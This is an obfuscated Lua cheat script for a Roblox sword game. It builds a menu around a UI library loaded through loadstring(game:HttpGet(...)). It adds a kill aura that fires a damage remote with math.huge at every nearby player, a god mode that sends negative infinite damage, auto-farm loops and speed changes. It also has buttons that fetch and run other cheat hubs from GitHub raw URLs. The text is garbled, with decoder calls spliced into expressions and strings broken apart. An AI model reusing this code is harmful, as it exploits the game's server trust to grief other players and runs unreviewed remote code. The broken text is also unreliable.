                                                    -- Play startup v_vokvhswv
                                                    v_ooc_rxba.PlaySound(v_k_uykjwh.v_rupopvfs, 1, function()
                                                        v_ooc_rxba.Notify(dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)0, dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)1 .. v_k_uykjwh.v_lusaxdvi, 5)
                                                        end)

                                                        -- Load v_osonyxrh Library
                                                        local v_hxzwhrlc = loadstring(game:HttpGet(v_k_uykjwh.v_zemgqamv))()
                                                        local v__siq_awm = v_hxzwhrlc:v__siq_awm(dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)2 .. v_k_uykjwh.v_lusaxdvi)
                                                        local v_ktrmaxo_ = v__siq_awm:Server(dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)3, dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)4)

                                                        -- Create v_osonyxrh v_vtifwjqm
                                                            local v_vtifwjqm = {
                                                                v_hpnjjbbt = v_ktrmaxo_:Channel(dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)5),
                                                                v_gwaz_qjg = v_ktrmaxo_:Channel(dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)6),
                                                                v_frwmhowe = v_ktrmaxo_:Channel(dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)7),
                                                                v_ypnxirlm = v_ktrmaxo_:Channel(dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)8),
                                                                v_bzlrbftu = v_ktrmaxo_:Channel(dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)9),
                                                                v_osonyxrh = v_ktrmaxo_:Channel(dec_inqejt("eB8UHE9AfBA=", 45)0),
                                                                v_quehnfqe = v_ktrmaxo_:Channel(dec_inqejt("eB8UHE9AfBA=", 45)1),
                                                                v_bjpsyqms = v_ktrmaxo_:Channel(dec_inqejt("eB8UHE9AfBA=", 45)2),
                                                                v_mkuwgaz_ = v_ktrmaxo_:Channel(dec_inqejt("eB8UHE9AfBA=", 45)3),
                                                                v_bmvmdtpa = v_ktrmaxo_:Channel(dec_inqejt("eB8UHE9AfBA=", 45)4),
                                                                v_qxtygwvg = v_ktrmaxo_:Channel(dec_inqejt("eB8UHE9AfBA=", 45)5)
                                                                }

                                                                -- 6. ═══════════════ CORE FUNCTIONS ═══════════════
                                                                local v_zvlfnmjn = {}

                                                                -- 6.1 Enhanced Sword Remote Firing
                                                                function v_zvlfnmjn.FireSwordRemote(times, delay)
                                                                    local v_oclc_rhk = v_ooc_rxba.GetCharacter()
                                                                    if not v_oclc_rhk then return end

                                                                    local v_gfroohzf = v_oclc_rhk:FindFirstChild(dec_inqejt("eB8UHE9AfBA=", 45)6) or v_pvlrlnos.Backpack:FindFirstChild(dec_inqejt("eB8UHE9AfBA=", 45)7)
                                                                    if not v_gfroohzf then return end

                                                                    local v_zpnckyxb = v_gfroohzf:FindFirstChild(dec_inqejt("eB8UHE9AfBA=", 45)8)
                                                                    if not v_zpnckyxb then return end

                                                                    local v_dhyousyr = v_zpnckyxb:FindFirstChild(dec_inqejt("eB8UHE9AfBA=", 45)9)
                                                                    if not v_dhyousyr then return end

                                                                    local v_tijttlck = v_dhyousyr:FindFirstChild(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)0)
                                                                    if not v_tijttlck then return end

                                                                    for v_mauyo_ts = 1, times do
                                                                        v_tijttlck:FireServer()
                                                                        if delay then task.wait(delay) end
                                                                    end
                                                                end

                                                                -- 6.2 Get all v_imglsrfj with caching
                                                                local v_poloyzn_ = {}
                                                                function v_zvlfnmjn.GetSwords(useCache)
                                                                    if useCache and #v_poloyzn_ > 0 then
                                                                        return v_poloyzn_
                                                                    end

                                                                    v_poloyzn_ = {}
                                                                    local v_oclc_rhk = v_ooc_rxba.GetCharacter()
                                                                    local v_vemfsxcf = v_pvlrlnos.Backpack

                                                                    for _, container in ipairs({v_vemfsxcf, v_oclc_rhk}) do
                                                                        for _, tool in ipairs(container:GetChildren()) do
                                                                            if tool:IsA(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)1) and tool.v_edrmmfte:lower():find(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)2) then
                                                                                table.insert(v_poloyzn_, tool)
                                                                            end
                                                                        end
                                                                    end

                                                                    return v_poloyzn_
                                                                end

                                                                -- 6.3 Enhanced Kill Aura System
                                                                function v_zvlfnmjn.KillAuraSystem()
                                                                    local v_dxmttyvu = 40
                                                                    local v_ananuwjt = true

                                                                    -- Create v_dxmttyvu slider
                                                                    v_vtifwjqm.v_hpnjjbbt:Slider(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)3, 10, 1000, v_dxmttyvu, function(value)
                                                                        v_dxmttyvu = value
                                                                    end)

                                                                    -- Find and setup v_gfroohzf
                                                                    local function setupSword()
                                                                        local v_imglsrfj = v_zvlfnmjn.GetSwords()
                                                                        if #v_imglsrfj == 0 then return nil end

                                                                        local v_gfroohzf = v_imglsrfj[1]
                                                                        if v_gfroohzf.v_uxzuzaoq == v_pvlrlnos.Backpack then
                                                                            v_youefgut:EquipTool(v_gfroohzf)
                                                                            task.wait(0.1)
                                                                        end

                                                                        return v_gfroohzf
                                                                    end

                                                                    -- v_hpnjjbbt kill aura loop
                                                                    v_qagwtjzn.v__rhfhmpb = v__ubaldnc.v_svcspoxa.Heartbeat:Connect(function()
                                                                        if not v_ananuwjt or not v_xrtseutw.v__rhfhmpb then return end

                                                                        local v_gfroohzf = setupSword()
                                                                        if not v_gfroohzf then return end

                                                                        local v_zpnckyxb = v_gfroohzf:FindFirstChild(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)4)
                                                                        local v_wgtbwunw = v_zpnckyxb and v_zpnckyxb:FindFirstChild(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)5)
                                                                        local v_ynazcq_y = v_wgtbwunw and v_wgtbwunw:FindFirstChild(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)6)

                                                                        if not v_ynazcq_y then return end

                                                                        local v_wpkddnj_ = v_gwaz_qjg:FindFirstChild(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)7)
                                                                        if not v_wpkddnj_ then return end

                                                                        for _, v_jhrbltts in ipairs(v__ubaldnc.v_iegmngkt:GetPlayers()) do
                                                                            if v_jhrbltts ~= v_pvlrlnos and v_jhrbltts.v_gwaz_qjg then
                                                                                local v_dxgxhvmx = v_jhrbltts.v_gwaz_qjg:FindFirstChild(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)8)
                                                                                local v_yjbddmqi = v_jhrbltts.v_gwaz_qjg:FindFirstChild(dec_gybpae("JS14MRsWJTUjLCUzJQB8fA==", 65)9)

                                                                                if v_dxgxhvmx and v_yjbddmqi and v_yjbddmqi.v_qcxegjfi > 0 then
                                                                                    local v_lsbygbii = (v_wpkddnj_.v_fpnqcbqy - v_dxgxhvmx.v_fpnqcbqy).Magnitude
                                                                                    if v_lsbygbii <= v_dxmttyvu then
                                                                                        v_ynazcq_y:FireServer(v_yjbddmqi, math.huge)
                                                                                    end
                                                                                end
                                                                            end
                                                                        end
                                                                    end)

                                                                    -- Toggle keybind
                                                                    v__ubaldnc.v_qywpnfav.InputBegan:Connect(function(input, processed)
                                                                        if processed then return end
                                                                        if input.v_mn_hvpam == Enum.v_mn_hvpam.E then
                                                                            v_ananuwjt = not v_ananuwjt
                                                                            v_ooc_rxba.Notify(dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)0, v_ananuwjt and dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)1 or dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)2, 2)
                                                                            end
                                                                        end)
                                                                    end

                                                                    -- 7. ═══════════════ FARMING SYSTEM ═══════════════
                                                                    local v_ymngrswd = {}

                                                                    -- 7.1 Slow Farm
                                                                    v_vtifwjqm.v_hpnjjbbt:Button(dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)3, function()
                                                                        v_xrtseutw.v_tdvetonk = true
                                                                        v_ooc_rxba.Notify(dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)4, dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)5, 2)

                                                                            task.spawn(function()
                                                                                while v_xrtseutw.v_tdvetonk do
                                                                                    v_zvlfnmjn.FireSwordRemote(4, 0.04)
                                                                                    task.wait()
                                                                                end
                                                                            end)
                                                                        end)

                                                                        v_vtifwjqm.v_hpnjjbbt:Button(dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)6, function()
                                                                            v_xrtseutw.v_tdvetonk = false
                                                                            v_ooc_rxba.Notify(dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)7, dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)8, 2)
                                                                            end)

                                                                            -- 7.2 Fast Farm
                                                                            v_vtifwjqm.v_hpnjjbbt:Button(dec_qwhwbo("wqrCosO3wrTCqsKjwoDCtMKtwonDt8O6wpfCn8Ozw7M=", 206)9, function()
                                                                                v_xrtseutw.v_gmhymsmg = true
                                                                                v_ooc_rxba.Notify(dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)0, dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)1, 2)

                                                                                    if not v_qagwtjzn.v_gmhymsmg then
                                                                                        v_qagwtjzn.v_gmhymsmg = v__ubaldnc.v_svcspoxa.Stepped:Connect(function()
                                                                                            if v_xrtseutw.v_gmhymsmg then
                                                                                                v_zvlfnmjn.FireSwordRemote(6)
                                                                                            end
                                                                                        end)
                                                                                    end
                                                                                end)

                                                                                v_vtifwjqm.v_hpnjjbbt:Button(dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)2, function()
                                                                                    v_xrtseutw.v_gmhymsmg = false
                                                                                    if v_qagwtjzn.v_gmhymsmg then
                                                                                        v_qagwtjzn.v_gmhymsmg:Disconnect()
                                                                                        v_qagwtjzn.v_gmhymsmg = nil
                                                                                    end
                                                                                    v_ooc_rxba.Notify(dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)3, dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)4, 2)
                                                                                    end)

                                                                                    -- 8. ═══════════════ MAIN FEATURES ═══════════════
                                                                                    -- 8.1 Kill Aura
                                                                                    v_vtifwjqm.v_hpnjjbbt:Button(dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)5, function()
                                                                                        if v_xrtseutw.v__rhfhmpb then return end
                                                                                        v_xrtseutw.v__rhfhmpb = true
                                                                                        v_zvlfnmjn.KillAuraSystem()
                                                                                        v_ooc_rxba.Notify(dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)6, dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)7, 3)
                                                                                        end)

                                                                                        -- 8.2 Sword Damage Script
                                                                                        v_vtifwjqm.v_hpnjjbbt:Button(dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)8, function()
                                                                                            local v_imglsrfj = v_zvlfnmjn.GetSwords()
                                                                                            local v_yjrjpmvd = 0

                                                                                            for _, v_gfroohzf in ipairs(v_imglsrfj) do
                                                                                                v_ooc_rxba.SafeExecute(function()
                                                                                                    v_gfroohzf.v_uxzuzaoq = v_pvlrlnos.Backpack
                                                                                                    v_gfroohzf.Handle.v_ojnlgtnv = true
                                                                                                    v_gfroohzf.Handle.v_ewegsspb = true
                                                                                                    v_gfroohzf.v_uxzuzaoq = v_gwaz_qjg

                                                                                                    v_gfroohzf.Handle.Touched:Connect(function(hit)
                                                                                                        local v_yjbddmqi = hit.v_uxzuzaoq and hit.v_uxzuzaoq:FindFirstChild(dec__aeok_("w5jDkMKFw5DDpcOSw6bDj8Oew7vDkMOWw5jDrcKBwoE=", 188)9)
                                                                                                        if v_yjbddmqi and hit.v_uxzuzaoq ~= v_gwaz_qjg then
                                                                                                            local v_wgtbwunw = v_gfroohzf.Handle:FindFirstChild(dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)0)
                                                                                                            local v_ynazcq_y = v_wgtbwunw and v_wgtbwunw:FindFirstChild(dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)1)
                                                                                                            if v_ynazcq_y then
                                                                                                                v_ynazcq_y:FireServer(v_yjbddmqi, math.huge)
                                                                                                            end
                                                                                                        end
                                                                                                    end)

                                                                                                    v_yjrjpmvd = v_yjrjpmvd + 1
                                                                                                end)
                                                                                            end

                                                                                            v_ooc_rxba.Notify(dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)2, dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)3 .. v_yjrjpmvd .. dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)4, 3)
                                                                                            end)

                                                                                            -- 8.3 Infinite Yield
                                                                                            v_vtifwjqm.v_hpnjjbbt:Button(dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)5, function()
                                                                                                v_ooc_rxba.LoadScript(dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)6)
                                                                                            end)

                                                                                            -- 9. ═══════════════ CHARACTER MODIFICATIONS ═══════════════
                                                                                            -- 9.1 v_iijdrrer controls with validation
                                                                                            local v_iijdrrer = {
                                                                                            v_xfjcfwfz = 16,
                                                                                            v_osdcjikr = 50
                                                                                            }

                                                                                            v_vtifwjqm.v_gwaz_qjg:Slider(dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)7, 0, 500, v_iijdrrer.v_xfjcfwfz, function(value)
                                                                                                v_iijdrrer.v_xfjcfwfz = value
                                                                                                local v_ui__yhle = v_ooc_rxba.GetHumanoid()
                                                                                                if v_ui__yhle then v_ui__yhle.v_xfjcfwfz = value end
                                                                                            end)

                                                                                            v_vtifwjqm.v_gwaz_qjg:Slider(dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)8, 0, 500, v_iijdrrer.v_osdcjikr, function(value)
                                                                                                v_iijdrrer.v_osdcjikr = value
                                                                                                local v_ui__yhle = v_ooc_rxba.GetHumanoid()
                                                                                                if v_ui__yhle then v_ui__yhle.v_osdcjikr = value end
                                                                                            end)

                                                                                            -- 9.2 Quick Speed Buttons
                                                                                            local v_dde_sxsu = {
                                                                                            {v_majdlsuo = dec_ktv_tn("w5PDm8KOw4/DksOvw5PDgMOVw5rDrcOfw5PDkMKKwoo=", 183)9, v_fgxeobrb = 16, v_mrsxpizf = 50},
                                                                                            {v_majdlsuo = dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)0, v_fgxeobrb = 100, v_mrsxpizf = 100},
                                                                                            {v_majdlsuo = dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)1, v_fgxeobrb = 250, v_mrsxpizf = 150},
                                                                                            {v_majdlsuo = dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)2, v_fgxeobrb = 500, v_mrsxpizf = 200}
                                                                                            }

                                                                                            for _, preset in ipairs(v_dde_sxsu) do
                                                                                                v_vtifwjqm.v_gwaz_qjg:Button(preset.v_majdlsuo, function()
                                                                                                    v_iijdrrer.v_xfjcfwfz = preset.v_fgxeobrb
                                                                                                    v_iijdrrer.v_osdcjikr = preset.v_mrsxpizf
                                                                                                    local v_ui__yhle = v_ooc_rxba.GetHumanoid()
                                                                                                    if v_ui__yhle then
                                                                                                        v_ui__yhle.v_xfjcfwfz = preset.v_fgxeobrb
                                                                                                        v_ui__yhle.v_osdcjikr = preset.v_mrsxpizf
                                                                                                    end
                                                                                                    v_ooc_rxba.Notify(dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)3, preset.v_majdlsuo .. dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)4, 2)
                                                                                                    end)
                                                                                                end

                                                                                                -- 9.3 Enhanced Respawn
                                                                                                v_vtifwjqm.v_gwaz_qjg:Button(dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)5, function()
                                                                                                    local v_oclc_rhk = v_ooc_rxba.GetCharacter()
                                                                                                    if not v_oclc_rhk then return end

                                                                                                    local v__omtiafu = v_ev_tfmwd.v_rpvhaenn
                                                                                                    local v_ui__yhle = v_ooc_rxba.GetHumanoid()

                                                                                                    if v_ui__yhle then
                                                                                                        v_ui__yhle.v_qcxegjfi = 0
                                                                                                        v_pvlrlnos.CharacterAdded:Wait()
                                                                                                        task.wait(0.2)

                                                                                                        local v_bphscjjd = v_pvlrlnos.v_gwaz_qjg:WaitForChild(dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)6)
                                                                                                        v_bphscjjd.v_rpvhaenn = v__omtiafu
                                                                                                        v_ooc_rxba.Notify(dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)7, dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)8, 2)
                                                                                                        end
                                                                                                    end)

                                                                                                    -- 9.4 God Mode System
                                                                                                    v_vtifwjqm.v_gwaz_qjg:Button(dec_slsbrf("XlYDSVlXVgljCXBDW10HBw==", 58)9, function()
                                                                                                        local v_ui__yhle = v_ooc_rxba.GetHumanoid()
                                                                                                        if not v_ui__yhle then return end

                                                                                                        local v_gfroohzf = v_gwaz_qjg:FindFirstChild(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)0) or v_pvlrlnos.Backpack:FindFirstChild(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)1)
                                                                                                        if v_gfroohzf then
                                                                                                            local v_wgtbwunw = v_gfroohzf.Handle:FindFirstChild(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)2)
                                                                                                            local v_ynazcq_y = v_wgtbwunw and v_wgtbwunw:FindFirstChild(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)3)
                                                                                                            if v_ynazcq_y then
                                                                                                                v_ynazcq_y:FireServer(v_ui__yhle, -math.huge)
                                                                                                                v_ooc_rxba.Notify(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)4, dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)5, 3)
                                                                                                                end
                                                                                                            end
                                                                                                        end)

                                                                                                        -- 9.5 Fixed Perma God Toggle
                                                                                                        v_vtifwjqm.v_gwaz_qjg:Toggle(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)6, false, function(state)
                                                                                                            v_xrtseutw.v_tk_v_xmq = state

                                                                                                            if state then
                                                                                                                -- v_hpnjjbbt god mode healing loop
                                                                                                                task.spawn(function()
                                                                                                                    while v_xrtseutw.v_tk_v_xmq do
                                                                                                                        v_ooc_rxba.SafeExecute(function()
                                                                                                                            local v_ui__yhle = v_ooc_rxba.GetHumanoid()
                                                                                                                            local v_gfroohzf = v_gwaz_qjg:FindFirstChild(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)7) or v_pvlrlnos.Backpack:FindFirstChild(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)8)

                                                                                                                            if v_ui__yhle and v_gfroohzf then
                                                                                                                                local v_wgtbwunw = v_gfroohzf.Handle:FindFirstChild(dec_tzukpv("w5/Dl8KCwojDmMO8w5PCjcOhw6zDvcOVw5/DjMKGwoY=", 187)9)
                                                                                                                                local v_ynazcq_y = v_wgtbwunw and v_wgtbwunw:FindFirstChild(dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)00)
                                                                                                                                if v_ynazcq_y then
                                                                                                                                    v_ynazcq_y:FireServer(v_ui__yhle, -math.huge)
                                                                                                                                end
                                                                                                                            end

                                                                                                                            -- Backup health protection
                                                                                                                            if v_ui__yhle then
                                                                                                                                v_ui__yhle.v_qcxegjfi = math.max(v_ui__yhle.v_qcxegjfi, v_ui__yhle.MaxHealth)
                                                                                                                            end
                                                                                                                        end)
                                                                                                                        task.wait(0.1) -- Run 10 times per second
                                                                                                                    end
                                                                                                                end)

                                                                                                                -- Prevent external tool pickup specifically
                                                                                                                    task.spawn(function()
                                                                                                                        while v_xrtseutw.v_tk_v_xmq do
                                                                                                                            v_ooc_rxba.SafeExecute(function()
                                                                                                                                local v_ui__yhle = v_ooc_rxba.GetHumanoid()
                                                                                                                                if v_ui__yhle then
                                                                                                                                    -- Check for tools that arendec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)01v_brr_h_wo%20Guidec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)02Auratus X Hubdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)03https://raw.githubusercontent.com/AnimatedKurai/v_ypnxirlm/refs/heads/main/Auratus%20Hub.txtdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)04Replication v_osonyxrhdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)05https://raw.githubusercontent.com/EEND2SCRIPTS/Replication/main/replicationdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)06Emperor Wingsdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)07https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Emperor%20Wings.luadec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)08Ghost Hubdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)09https://raw.githubusercontent.com/AlznX/Roblox-v_ypnxirlm/refs/heads/main/Ghost_Hubdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)10Dragon Hub Premiumdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)11https://raw.githubusercontent.com/AlznX/Roblox-v_ypnxirlm/main/Dragon%2520Hubdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)12Slayer Hubdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)13https://raw.githubusercontent.com/Nightmareloil/Own1/main/Truecodedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)14Linedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)15m So Alonedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)166774872457dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)17🎵 Hate Medec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)186873260626dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)19🎵 Safe & Sounddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)207024233823dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)21🎵 Dreamersdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)227029083554dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)23🎵 Internet Boydec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)245410084870dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)25🎵 Letdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)26v_brr_h_wo Likedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)277028997537dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)28🎵 New Worlddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)295410082346dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)30🎵 TOMBdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)316782202354dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)32🎵 You Take Medec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)337029070008dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)34🎵 Thinking About Youdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)357023445033dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)36🛑 Stop All v_bmvmdtpadec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)37Sounddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)38v_bmvmdtpadec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)39All music and sounds were 